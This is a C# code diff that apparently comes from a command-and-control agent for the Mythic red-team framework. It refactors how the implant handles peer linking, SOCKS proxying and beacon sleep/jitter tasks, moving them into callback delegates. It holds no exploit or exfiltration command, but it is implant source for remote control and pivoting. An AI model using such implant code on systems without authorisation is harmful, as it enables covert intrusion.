@@ -8,11 +8,16 @@ using System.Collections.Concurrent;
 using System.Text;
 using Athena.Utilities;
 using Newtonsoft.Json;
+using Athena.Models.Mythic.Response;
 
 namespace Athena.Commands
 {
     public class CommandHandler
     {
+        public Action<int[]> ActionSetSleepAndJitter;
+        public Action<MythicJob> ActionStartForwarder;
+        public Action<MythicJob> ActionStartSocks;
+
         private ConcurrentDictionary<string, MythicJob> activeJobs { get; set; }
         private AssemblyHandler assemblyHandler { get; set; }
         private DownloadHandler downloadHandler { get; set; }
@@ -62,7 +67,7 @@ namespace Athena.Commands
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "link":
-                    this.responseResults.Add(await Globals.mc.MythicConfig.forwarder.Link(job));
+                    ActionStartForwarder(job);
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "load":
@@ -86,15 +91,7 @@ namespace Athena.Commands
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "socks": //Maybe can be dynamically loaded? Might be better to keep it built-in
-                    if(await Globals.socksHandler.Start())
-                    {
-                        this.responseResults.Add(new ResponseResult
-                        {
-                            user_output = "Socks Started",
-                            completed = "true",
-                            task_id = job.task.id,
-                        });
-                    }
+                    ActionStartSocks(job);
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "stop-assembly":
@@ -341,27 +338,15 @@ namespace Athena.Commands
         {
             StringBuilder sb = new StringBuilder();
             var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
-            if (sleepInfo.ContainsKey("sleep"))
+
+            try
             {
-                try
-                {
-                    Globals.mc.MythicConfig.sleep = int.Parse(sleepInfo["sleep"].ToString());
-                }
-                catch (Exception e)
-                {
-                    sb.AppendLine("Invalid sleeptime specified.");
-                }
+                ActionSetSleepAndJitter(new int[] { int.Parse(sleepInfo["sleep"].ToString()), int.Parse(sleepInfo["jitter"].ToString()) });
+                sb.AppendLine($"Set sleep to: {sleepInfo["sleep"]}");
             }
-            if (sleepInfo.ContainsKey("jitter"))
+            catch (Exception e)
             {
-                try
-                {
-                    Globals.mc.MythicConfig.jitter = int.Parse(sleepInfo["jitter"].ToString());
-                }
-                catch (Exception e)
-                {
-                    sb.AppendLine("Invalid jitter specified.");
-                }
+                sb.AppendLine("Invalid sleep or jitter specified.");
             }
 
             return new ResponseResult
